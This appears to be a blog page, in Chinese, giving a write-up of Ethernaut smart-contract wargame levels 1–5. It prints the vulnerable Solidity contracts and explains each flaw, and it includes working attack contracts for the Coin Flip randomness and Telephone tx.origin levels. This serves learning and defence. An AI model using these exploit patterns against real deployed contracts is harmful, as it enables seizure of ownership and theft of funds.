@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="baidu-site-verification" content="093lY4ziMu" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="description" content="Thomas_Xu&#39;s Bolg">
+    <meta name="keyword"  content="Thomas_Xu, BlockChain">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
+    <title>
+        
+          ethernaut 题解 01-06 - Thomas_Xu
+        
+    </title>
+
+    <link rel="canonical" href="https://dusign.net/2022/06/21/ethernaut01/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS --> 
+    
+        
+<link rel="stylesheet" href="/css/dusign-light.css">
+
+        
+<link rel="stylesheet" href="/css/dusign-common-light.css">
+
+        
+<link rel="stylesheet" href="/css/font-awesome.css">
+
+        
+<link rel="stylesheet" href="/css/toc.css">
+
+        <!-- background effects end -->
+    
+    
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+    
+<link rel="stylesheet" href="/css/widget.css">
+
+
+    
+<link rel="stylesheet" href="/css/rocket.css">
+
+
+    
+<link rel="stylesheet" href="/css/signature.css">
+
+
+    
+<link rel="stylesheet" href="/css/fonts.googleapis.css">
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+    <!-- photography -->
+    
+<link rel="stylesheet" href="/css/photography.css">
+
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- background effects start -->
+    
+    <!-- background effects end -->
+
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('Iron-Man-3.jpg')
+                /*post*/
+            
+        
+    }
+    
+    #signature{
+        background-image: url('/img/signature/dusign.png');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#ethernaut" title="ethernaut">ethernaut</a>
+                            
+                        </div>
+                        <h1>ethernaut 题解 01-06</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by Thomas_Xu on
+                            2022-06-21
+                        </span>
+
+                        
+                            <div class="blank_box"></div>
+                            <span class="meta">
+                                Words <span class="post-count">3k</span> and
+                                Reading Time <span class="post-count">12</span> Minutes
+                            </span>
+                            <div class="blank_box"></div>
+                            <!-- 不蒜子统计 start -->
+                            <span class="meta">
+                                Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+                            </span>
+                            <!-- 不蒜子统计 end -->
+                        
+
+                    </div>
+                
+
+                </div>
+            </div>
+        </div>      
+    </div>
+
+    
+    <div class="waveWrapper">
+        <div class="wave wave_before" style="background-image: url('/img/wave-light.png')"></div>
+        <div class="wave wave_after" style="background-image: url('/img/wave-light.png')"></div>
+    </div>
+    
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Thomas_Xu&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/categories/">Categories</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="Ethernaut靶场刷题记录-1-6"><a href="#Ethernaut靶场刷题记录-1-6" class="headerlink" title="Ethernaut靶场刷题记录(1-6)"></a>Ethernaut靶场刷题记录(1-6)</h1><hr>
+<pre><code>author：Thomas_Xu
+</code></pre><h2 id="01-FallBack"><a href="#01-FallBack" class="headerlink" title="01 FallBack"></a>01 FallBack</h2><p>这道题是比较简单的，合约的逻辑有问题导致出现漏洞<br/><br>我们先来了解一下receive和fallback的区别：</p>
+<blockquote>
+<p><strong>receive():</strong><br>    一个合约只能有一个receive函数，该函数不能有参数和返回值，需设置为external，payable；<br><strong>fallback():</strong><br>    一个合约只能有一个receive函数，该函数不能有参数和返回值，需设置为external；<br>    可设置为payable；</p>
+</blockquote>
+<p>当本合约的其他函数不匹配调用，或调用者未提供任何信息，且没有receive函数，fallback函数被触发；<br>当本合约收到ether但并未被调用任何函数，未接受任何数据，receive函数被触发；</p>
+<p>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    contributions[msg.sender] &#x3D; 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目中给到的SafeMath的地址已经获取不到了，我直接选择找了老版本的SafeMath源码在我本地拉取下来。或者也可以直接用<code>import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;</code>路径代替。<br/></p>
+<p>题目想要我们获得合约的所有权，<code>owner</code>再使用<code>withdraw</code>提取出来</p>
+<ul>
+<li><p>解题思路<br>  阅读完源码发现此合约的<code>receive</code>函数是有明显漏洞的，我们只需要向此函数转发出一笔转账交易即可将<code>owner</code>的所有权改为自己</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  当然，为了达成<code>receive</code>中的require限制条件，我们还需要执行一次<code>contribute()</code>来将我们的<code>contributions[msg.sender] &gt; 0</code><br/><br>  在获得<code>owner</code>后，执行<code>withdraw()</code>即可通关。</p>
+</li>
+<li><p>解题步骤</p>
+<ol>
+<li>在控制台中调用<code>contract.contribute({value:1)</code>在不带单位的情况下默认单位为<code>wei</code><br><img src="../images\ethernaut\e01\01.png" alt=""></li>
+<li>可以使用<code>contract.address</code>命令查看合约地址，然后使用metamask给合约地址转一笔账<br><img src="../images\ethernaut\e01\02_1.png" alt=""><br><img src="../images\ethernaut\e01\02_2.png" alt=""></li>
+<li>此时<code>owner</code>应该已经到了，我们来看一下：<br><img src="../images\ethernaut\e01\03.png" alt=""></li>
+<li>执行<code>withdraw()</code>函数进行提款<br><img src="../images\ethernaut\e01\04.png" alt=""></li>
+<li>通关<br><img src="../images\ethernaut\e01\05.png" alt=""></li>
+</ol>
+</li>
+</ul>
+<h2 id="02-Fallout"><a href="#02-Fallout" class="headerlink" title="02 Fallout"></a>02 Fallout</h2><p>  emmm很白痴的关卡<br>  先看代码</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">          require(</span><br><span class="line">              msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">              &quot;caller is not the owner&quot;</span><br><span class="line">          );</span><br><span class="line">          _;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] &#x3D; allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  题目要求获得合约的所有权。<br>  我看了这个合约很久，一直没找到可以攻击的地方……直到我看到了<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>  仔细看这个构造函数的名字，我们会发现<code>Fal1out</code>中间居然有个<code>1</code>关键是他还在上面注释了<code>constructor</code>就很坑。<br/><br>  那既然它不是个构造函数，并且具有构造函数的功能，那我们直接调用这个错误的“构造函数”就可以获得合约的所有权了。</p>
+<blockquote>
+<p>构造函数最好用<code>constructor() public {……}</code>的写法</p>
+<ul>
+<li>解题步骤<ol>
+<li>调用<code>fal1out</code>函数<br><img src="../images/ethernaut/e02/01.png" alt=""></li>
+<li>可以看到此时我们已经获得了合约的所有权<br><img src="../images/ethernaut/e02/03.png" alt=""></li>
+<li>通关<br><img src="../images/ethernaut/e02/suc.png" alt=""></li>
+</ol>
+</li>
+</ul>
+</blockquote>
+<h2 id="03-Coin-Flip"><a href="#03-Coin-Flip" class="headerlink" title="03 Coin Flip"></a>03 Coin Flip</h2><p>这是一个和区块结构有关的漏洞，由于用<code>blockhash(block.number.sub(1))</code>的方式计算上一区块的哈希的方式是极容易被攻击利用的。<br/><br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue.div(FACTOR);</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side &#x3D;&#x3D; _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins &#x3D; 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个合约是一个“掷硬币猜正反”的游戏，要求连续猜对10次极为通关。<br/><br>先来分析一下合约：<br><code>block.number</code>可以用来获取当前交易对应block的编号，而这里减1获取的就是前一个block的编号，而<code>blockhash(id)</code>可以获取对应id的block的hash值，然后uint256将其转换为16进制对应的数值。其中给的factor就是<code>2^{256}/2</code>，所以每次做完除法的结果有一半几率是0，一半是1。<br>这里补充一下几个知识：</p>
+<ul>
+<li><p>补充</p>
+<ul>
+<li><strong>Solidity block对象</strong><br>block.coinbase (address): 当前块的矿工的地址<br>block.difficulty (uint):当前块的难度系数<br>block.gaslimit (uint):当前块gas的上限<br>block.number (uint):当前块编号<br>block.blockhash (function(uint) returns (bytes32)):函数，返回指定块的哈希值，已经被内建函数blockhash所代替<br>block.timestamp (uint):当前块的时间戳</li>
+</ul>
+<p><br/></p>
+<ul>
+<li><p><strong>Revert</strong><br>revert是solidity中的一种错误处理机制，<br>而revert一旦触发，会导致当前调用中的所有更改都被还原并将错误数据传递回调用者。<br>revert由两种使用形式：</p>
+<ul>
+<li>revert ：<code>revert CustomError（arg1， arg2）;</code>该语句将自定义错误作为不带括号的直接参数</li>
+<li>revert() ：<code>revert（）;revert（“description”）;</code>出于向后兼容的原因，还有一个函数，它使用括号并接受字符串</li>
+</ul>
+<p><br/></p>
+</li>
+<li><p><strong>Revert与Require与Assert</strong></p>
+<ul>
+<li>Assert： 可以理解为严厉一点的判断，如果判断失败，将会burn掉你的gas</li>
+<li>Require: 可以理解为温和一点的判断，就算判断失败，gas会返回给调用者</li>
+<li>Revert ：revert的用法和throw很像，也会撤回所有的状态转变。但是它有两点不同：<ol>
+<li>它允许你返回一个值</li>
+<li>它会把所有剩下的gas退回给caller</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<p>详情参见<a href="https://docs.soliditylang.org/en/latest/control-structures.html#revert-statement" target="_blank" rel="noopener">solidity参考文档</a><br><br/></p>
+</li>
+<li><p>漏洞分析：<br>本题的漏洞就出在通过<code>block.blockhash(block.number - 1)</code>获取负一高度的区块哈希来生成随机数的方式是极易被攻击利用的。</p>
+<blockquote>
+<p>原理是在区块链中，一个区块包含多个交易，我们可以先运行一下上述除法计算的过程获取结果究竟是0还是1，然后再发送对应的结果过去，区块链中块和快之前的间隔大概有10秒，手动去做会有问题，而且不能保证我们计算的合约是否和题目运算调用在同一个block上，因此需要写一个攻击合约完成调用。我们在攻击合约中调用题目中的合约，可以保证两个交易一定被打包在同一个区块上，因此它们获取的<code>block.number.sub(1)</code>是一样的。</p>
+</blockquote>
+<p>其实就是利用了一个区块中可能由多个交易，而我们可以自己创建一个交易，执行与题目中一样的语句后得到的<code>block.number.sub(1)</code>是一样的<br><br/></p>
+<p>攻击合约代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line">import &#39;.&#x2F;CoinFlip.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">  address adr &#x3D; 0xFd288CbD59B3f74A70B10730a076Ad0b59479C56;&#x2F;&#x2F;被攻击合约地址</span><br><span class="line">  CoinFlip coin &#x3D; CoinFlip(adr);</span><br><span class="line"></span><br><span class="line">  function dosome() public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue.div(FACTOR);</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line">    coin.flip(side);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>部署成功后只需要执行10次<code>dosome</code>方法即可</p>
+<blockquote>
+<p>我试过编写一个函数用一个for循环来控制<code>dosome()</code>执行的次数，最终以失败告终，应该是由于循环多了之后造成gas超过了gaslimit的上限。<br>解题步骤：</p>
+</blockquote>
+</li>
+</ul>
+<ol>
+<li>将我们的攻击合约部署在测试链上</li>
+<li>执行10次<code>dosome()</code>函数</li>
+<li>通关<br><img src="../images/ethernaut/e03/01.png" alt=""></li>
+</ol>
+<h2 id="04-Telephone"><a href="#04-Telephone" class="headerlink" title="04 Telephone"></a>04 Telephone</h2><p>此题考查<code>tx.origin</code>和<code>msg.sender</code>的区别。没有什么难点<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin !&#x3D; msg.sender) &#123;</span><br><span class="line">      owner &#x3D; _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目要求获得合约所有权，可以看到只要满足<code>tx.origin != msg.sender</code>就行。在此介绍一下<code>tx.origin</code>：</p>
+<blockquote>
+<p>tx.origin是Solidity的一个全局变量，它遍历整个调用栈并返回最初发送调用（或事务）的帐户的地址。</p>
+</blockquote>
+<p><strong>在智能合约中使用此变量进行身份验证会使合约容易受到类似网络钓鱼的攻击。</strong><br/><br>因为tx.origin是交易的原始发起者，而我们可以通过很多方式使得tx.origin作为智能合约的授权变得不可靠。</p>
+<blockquote>
+<p>举个例子：假设A、B、C都是已经部署的合约，如果我们用A去调用C，即A-&gt;C，那么在C合约看来，A既是tx.origin，又是msg.sender。如果调用链是A-&gt;B-&gt;C，那么对于合约C来说，A是tx.origin，B是msg.sender，即msg.sender是直接调用的一方，而tx.origin是交易的原始发起者</p>
+</blockquote>
+<ul>
+<li><p>漏洞分析<br>在此题中，我们只需要写一个攻击合约，使攻击合约通过另一个地址去调用受攻击合约就行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Telephone t;</span><br><span class="line">    constructor(address _adr) public&#123;</span><br><span class="line">        t &#x3D; Telephone(_adr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp () public &#123;</span><br><span class="line">        t.changeOwner(0x100200fF289D4dA0634fF36d7f5D96524f7EFf67);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>总结：<br>tx.origin不应该用于智能合约的授权。更多的时候采用<code>msg.sender == owner</code>来进行判断。<br/><br>但它也有自己使用的场景，比如想要拒绝外部合约调用当前合约则可使用<code>require（tx.origin ==msg.sender）</code>来进行实现。</li>
+</ul>
+<h2 id="05-Token"><a href="#05-Token" class="headerlink" title="05 Token"></a>05 Token</h2><p>这是一个整数溢出的漏洞<br>先看代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; totalSupply &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;&#x3D; 0);</span><br><span class="line">    balances[msg.sender] -&#x3D; _value;</span><br><span class="line">    balances[_to] +&#x3D; _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
